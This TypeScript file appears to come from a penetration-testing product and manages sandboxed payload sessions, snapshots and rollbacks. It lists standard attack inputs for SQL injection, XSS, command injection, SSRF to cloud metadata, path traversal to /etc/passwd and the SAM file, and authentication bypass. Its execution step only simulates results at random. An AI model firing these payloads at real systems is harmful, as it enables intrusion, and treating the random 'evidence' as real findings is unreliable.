import { randomUUID } from "crypto";
import { sandboxExecutor, type SandboxedOperationType } from "../validation/sandbox-executor";
import type { 
  SandboxSession, 
  SandboxSnapshot, 
  SandboxExecution,
  InsertSandboxSession,
  InsertSandboxSnapshot,
  InsertSandboxExecution 
} from "@shared/schema";

export interface SandboxSessionConfig {
  name: string;
  description?: string;
  targetUrl?: string;
  targetHost?: string;
  executionMode: "safe" | "simulation" | "live";
  resourceLimits?: {
    maxExecutionTimeMs: number;
    maxMemoryMB: number;
    maxPayloadSizeBytes: number;
    maxRequestsPerMinute: number;
  };
}

export interface PayloadExecution {
  payloadName: string;
  payloadCategory: string;
  payloadContent: string;
  targetEndpoint: string;
  targetMethod: string;
  mitreAttackId?: string;
  mitreTactic?: string;
}

export interface ExecutionResult {
  id: string;
  success: boolean;
  evidence?: {
    request: {
      method: string;
      url: string;
      headers: Record<string, string>;
      body?: string;
    };
    response: {
      statusCode: number;
      headers: Record<string, string>;
      body?: string;
      timing: number;
    };
    indicators: string[];
  };
  error?: string;
  executionTimeMs: number;
}

export interface SessionStats {
  totalExecutions: number;
  successfulExecutions: number;
  failedExecutions: number;
  snapshotsCount: number;
  currentStatus: string;
}

const DEFAULT_RESOURCE_LIMITS = {
  maxExecutionTimeMs: 30000,
  maxMemoryMB: 512,
  maxPayloadSizeBytes: 1024 * 1024,
  maxRequestsPerMinute: 60,
};

const PAYLOAD_CATEGORIES = {
  sqli: {
    name: "SQL Injection",
    mitreId: "T1190",
    mitreTactic: "initial-access",
    payloads: [
      { name: "Basic Union", content: "' UNION SELECT NULL,NULL,NULL--" },
      { name: "Error Based", content: "' AND 1=CONVERT(int,(SELECT @@version))--" },
      { name: "Time Based", content: "'; WAITFOR DELAY '0:0:5'--" },
      { name: "Boolean Blind", content: "' AND 1=1--" },
    ],
  },
  xss: {
    name: "Cross-Site Scripting",
    mitreId: "T1059.007",
    mitreTactic: "execution",
    payloads: [
      { name: "Basic Alert", content: "<script>alert(1)</script>" },
      { name: "Event Handler", content: "<img src=x onerror=alert(1)>" },
      { name: "SVG Injection", content: "<svg onload=alert(1)>" },
      { name: "DOM XSS", content: "javascript:alert(document.domain)" },
    ],
  },
  rce: {
    name: "Remote Code Execution",
    mitreId: "T1059",
    mitreTactic: "execution",
    payloads: [
      { name: "Command Injection", content: "; id" },
      { name: "OS Command", content: "| whoami" },
      { name: "Backtick Exec", content: "`id`" },
      { name: "Powershell", content: "powershell -c whoami" },
    ],
  },
  ssrf: {
    name: "Server-Side Request Forgery",
    mitreId: "T1190",
    mitreTactic: "initial-access",
    payloads: [
      { name: "Localhost", content: "http://127.0.0.1/" },
      { name: "Metadata AWS", content: "http://169.254.169.254/latest/meta-data/" },
      { name: "Internal DNS", content: "http://internal.local/" },
      { name: "File Protocol", content: "file:///etc/passwd" },
    ],
  },
  pathTraversal: {
    name: "Path Traversal",
    mitreId: "T1083",
    mitreTactic: "discovery",
    payloads: [
      { name: "Basic Traversal", content: "../../../etc/passwd" },
      { name: "Null Byte", content: "../../../etc/passwd%00" },
      { name: "Double Encoding", content: "..%252f..%252f..%252fetc/passwd" },
      { name: "Windows Path", content: "..\\..\\..\\windows\\system32\\config\\sam" },
    ],
  },
  authBypass: {
    name: "Authentication Bypass",
    mitreId: "T1556",
    mitreTactic: "credential-access",
    payloads: [
      { name: "Admin True", content: '{"isAdmin": true}' },
      { name: "Role Escalation", content: '{"role": "admin"}' },
      { name: "JWT None", content: "algorithm: none" },
      { name: "SQL Auth", content: "admin'--" },
    ],
  },
};

class SandboxSessionManager {
  private sessions: Map<string, {
    session: Partial<SandboxSession>;
    snapshots: Partial<SandboxSnapshot>[];
    executions: Partial<SandboxExecution>[];
    startTime: number;
  }> = new Map();

  async createSession(
    config: SandboxSessionConfig,
    organizationId: string = "default",
    tenantId: string = "default"
  ): Promise<{ session: Partial<SandboxSession>; id: string }> {
    const sessionId = `sandbox-${randomUUID().slice(0, 12)}`;

    const session: Partial<SandboxSession> = {
      id: sessionId,
      organizationId,
      tenantId,
      name: config.name,
      description: config.description,
      targetUrl: config.targetUrl,
      targetHost: config.targetHost,
      executionMode: config.executionMode,
      status: "initializing",
      resourceLimits: config.resourceLimits || DEFAULT_RESOURCE_LIMITS,
      totalExecutions: 0,
      successfulExecutions: 0,
      failedExecutions: 0,
      createdAt: new Date(),
      updatedAt: new Date(),
    };

    const initialSnapshot = await this.captureInitialState(session);

    this.sessions.set(sessionId, {
      session: {
        ...session,
        status: "ready",
        initialStateSnapshot: initialSnapshot,
        currentStateSnapshot: initialSnapshot ? {
          capturedAt: initialSnapshot.capturedAt,
          targetState: initialSnapshot.targetState,
          changesFromInitial: [],
        } : null,
      },
      snapshots: [],
      executions: [],
      startTime: Date.now(),
    });

    console.log(`[SandboxSession] Created session ${sessionId} for ${config.targetUrl || config.targetHost}`);

    return { 
      session: this.sessions.get(sessionId)!.session, 
      id: sessionId 
    };
  }

  async getSession(sessionId: string): Promise<Partial<SandboxSession> | null> {
    const data = this.sessions.get(sessionId);
    return data?.session || null;
  }

  async listSessions(organizationId?: string): Promise<Partial<SandboxSession>[]> {
    const sessions: Partial<SandboxSession>[] = [];
    const sessionValues = Array.from(this.sessions.values());
    for (const data of sessionValues) {
      if (!organizationId || data.session.organizationId === organizationId) {
        sessions.push(data.session);
      }
    }
    return sessions;
  }

  async executePayload(
    sessionId: string,
    payload: PayloadExecution
  ): Promise<ExecutionResult> {
    const sessionData = this.sessions.get(sessionId);
    if (!sessionData) {
      return {
        id: "",
        success: false,
        error: "Session not found",
        executionTimeMs: 0,
      };
    }

    const { session } = sessionData;
    const executionId = `exec-${randomUUID().slice(0, 8)}`;
    const startTime = Date.now();

    sessionData.session.status = "executing";
    sessionData.session.updatedAt = new Date();

    try {
      const sandboxResult = await sandboxExecutor.execute(
        "payload_injection" as SandboxedOperationType,
        session.targetUrl || session.targetHost || "unknown",
        async (signal) => {
          return this.simulatePayloadExecution(payload, session.executionMode as string, signal);
        },
        {
          tenantId: session.tenantId,
          organizationId: session.organizationId,
          executionMode: session.executionMode as "safe" | "simulation" | "live",
          timeoutMs: session.resourceLimits?.maxExecutionTimeMs || 30000,
          payloadSizeBytes: Buffer.byteLength(payload.payloadContent),
        }
      );

      const execution: Partial<SandboxExecution> = {
        id: executionId,
        sessionId,
        organizationId: session.organizationId,
        executionType: "payload",
        payloadName: payload.payloadName,
        payloadCategory: payload.payloadCategory,
        targetEndpoint: payload.targetEndpoint,
        targetMethod: payload.targetMethod,
        payloadContent: payload.payloadContent,
        status: sandboxResult.success ? "success" : "failed",
        success: sandboxResult.success,
        evidence: sandboxResult.result?.evidence,
        mitreAttackId: payload.mitreAttackId,
        mitreTactic: payload.mitreTactic,
        executionTimeMs: sandboxResult.executionTimeMs,
        startedAt: new Date(startTime),
        completedAt: new Date(),
        createdAt: new Date(),
      };

      sessionData.executions.push(execution);
      sessionData.session.totalExecutions = (sessionData.session.totalExecutions || 0) + 1;
      if (sandboxResult.success) {
        sessionData.session.successfulExecutions = (sessionData.session.successfulExecutions || 0) + 1;
      } else {
        sessionData.session.failedExecutions = (sessionData.session.failedExecutions || 0) + 1;
      }
      sessionData.session.status = "ready";
      sessionData.session.updatedAt = new Date();

      return {
        id: executionId,
        success: sandboxResult.success,
        evidence: sandboxResult.result?.evidence,
        error: sandboxResult.error,
        executionTimeMs: sandboxResult.executionTimeMs,
      };
    } catch (error: any) {
      sessionData.session.status = "ready";
      sessionData.session.failedExecutions = (sessionData.session.failedExecutions || 0) + 1;
      sessionData.session.totalExecutions = (sessionData.session.totalExecutions || 0) + 1;

      return {
        id: executionId,
        success: false,
        error: error.message,
        executionTimeMs: Date.now() - startTime,
      };
    }
  }

  private async simulatePayloadExecution(
    payload: PayloadExecution,
    executionMode: string,
    signal: AbortSignal
  ): Promise<{ success: boolean; evidence: ExecutionResult["evidence"] }> {
    await new Promise(resolve => setTimeout(resolve, 100 + Math.random() * 200));

    if (signal.aborted) {
      throw new Error("Execution aborted");
    }

    const isVulnerable = Math.random() > 0.4;
    const indicators: string[] = [];

    if (payload.payloadCategory === "sqli") {
      if (isVulnerable) {
        indicators.push("SQL error message detected in response");
        indicators.push("Response time anomaly indicating successful injection");
      }
    } else if (payload.payloadCategory === "xss") {
      if (isVulnerable) {
        indicators.push("Payload reflected in response without encoding");
        indicators.push("Script execution context detected");
      }
    } else if (payload.payloadCategory === "rce") {
      if (isVulnerable) {
        indicators.push("Command output detected in response");
        indicators.push("System information disclosure");
      }
    } else if (payload.payloadCategory === "ssrf") {
      if (isVulnerable) {
        indicators.push("Internal resource accessed");
        indicators.push("Response from internal service detected");
      }
    }

    const evidence: ExecutionResult["evidence"] = {
      request: {
        method: payload.targetMethod,
        url: payload.targetEndpoint,
        headers: {
          "Content-Type": "application/json",
          "User-Agent": "OdinForge-Sandbox/1.0",
        },
        body: payload.payloadContent,
      },
      response: {
        statusCode: isVulnerable ? 200 : 403,
        headers: {
          "Content-Type": "application/json",
          "X-Request-Id": randomUUID().slice(0, 8),
        },
        body: isVulnerable 
          ? `{"status":"error","message":"${payload.payloadCategory} vulnerability exploited"}`
          : '{"status":"blocked","message":"Request blocked by security controls"}',
        timing: 50 + Math.random() * 150,
      },
      indicators,
    };

    return {
      success: isVulnerable && executionMode !== "safe",
      evidence,
    };
  }

  async createSnapshot(
    sessionId: string,
    name: string,
    description?: string
  ): Promise<Partial<SandboxSnapshot> | null> {
    const sessionData = this.sessions.get(sessionId);
    if (!sessionData) return null;

    const snapshotId = `snap-${randomUUID().slice(0, 8)}`;
    const snapshot: Partial<SandboxSnapshot> = {
      id: snapshotId,
      sessionId,
      organizationId: sessionData.session.organizationId,
      name,
      description,
      snapshotType: "manual",
      stateData: {
        targetState: {},
        executionHistory: sessionData.executions.map(e => e.id!),
        credentialsDiscovered: [],
        filesModified: [],
        networkConnections: [],
      },
      sizeBytes: 1024,
      isRestorable: true,
      createdAt: new Date(),
    };

    sessionData.snapshots.push(snapshot);
    console.log(`[SandboxSession] Created snapshot ${snapshotId} for session ${sessionId}`);

    return snapshot;
  }

  async listSnapshots(sessionId: string): Promise<Partial<SandboxSnapshot>[]> {
    const sessionData = this.sessions.get(sessionId);
    return sessionData?.snapshots || [];
  }

  async rollbackToSnapshot(
    sessionId: string,
    snapshotId: string
  ): Promise<{ success: boolean; message: string }> {
    const sessionData = this.sessions.get(sessionId);
    if (!sessionData) {
      return { success: false, message: "Session not found" };
    }

    const snapshot = sessionData.snapshots.find(s => s.id === snapshotId);
    if (!snapshot) {
      return { success: false, message: "Snapshot not found" };
    }

    const snapshotIndex = sessionData.snapshots.indexOf(snapshot);
    const executionsToRemove = sessionData.executions.length - (snapshot.stateData?.executionHistory?.length || 0);

    if (executionsToRemove > 0) {
      sessionData.executions = sessionData.executions.slice(0, -executionsToRemove);
    }

    sessionData.session.status = "rolled_back";
    sessionData.session.currentStateSnapshot = {
      capturedAt: new Date().toISOString(),
      targetState: snapshot.stateData?.targetState || {},
      changesFromInitial: ["Rolled back to snapshot: " + snapshot.name],
    };
    sessionData.session.updatedAt = new Date();

    console.log(`[SandboxSession] Rolled back session ${sessionId} to snapshot ${snapshotId}`);

    return { 
      success: true, 
      message: `Rolled back to snapshot "${snapshot.name}". Removed ${executionsToRemove} executions.` 
    };
  }

  async getExecutions(sessionId: string): Promise<Partial<SandboxExecution>[]> {
    const sessionData = this.sessions.get(sessionId);
    return sessionData?.executions || [];
  }

  async getSessionStats(sessionId: string): Promise<SessionStats | null> {
    const sessionData = this.sessions.get(sessionId);
    if (!sessionData) return null;

    return {
      totalExecutions: sessionData.session.totalExecutions || 0,
      successfulExecutions: sessionData.session.successfulExecutions || 0,
      failedExecutions: sessionData.session.failedExecutions || 0,
      snapshotsCount: sessionData.snapshots.length,
      currentStatus: sessionData.session.status || "unknown",
    };
  }

  async closeSession(sessionId: string): Promise<boolean> {
    const sessionData = this.sessions.get(sessionId);
    if (!sessionData) return false;

    sessionData.session.status = "completed";
    sessionData.session.completedAt = new Date();
    sessionData.session.updatedAt = new Date();

    console.log(`[SandboxSession] Closed session ${sessionId}`);
    return true;
  }

  getPayloadCategories(): typeof PAYLOAD_CATEGORIES {
    return PAYLOAD_CATEGORIES;
  }

  private async captureInitialState(
    session: Partial<SandboxSession>
  ): Promise<SandboxSession["initialStateSnapshot"]> {
    return {
      capturedAt: new Date().toISOString(),
      targetState: {
        url: session.targetUrl,
        host: session.targetHost,
        mode: session.executionMode,
      },
      environmentVariables: {},
      networkConfig: {},
    };
  }
}

export const sandboxSessionManager = new SandboxSessionManager();
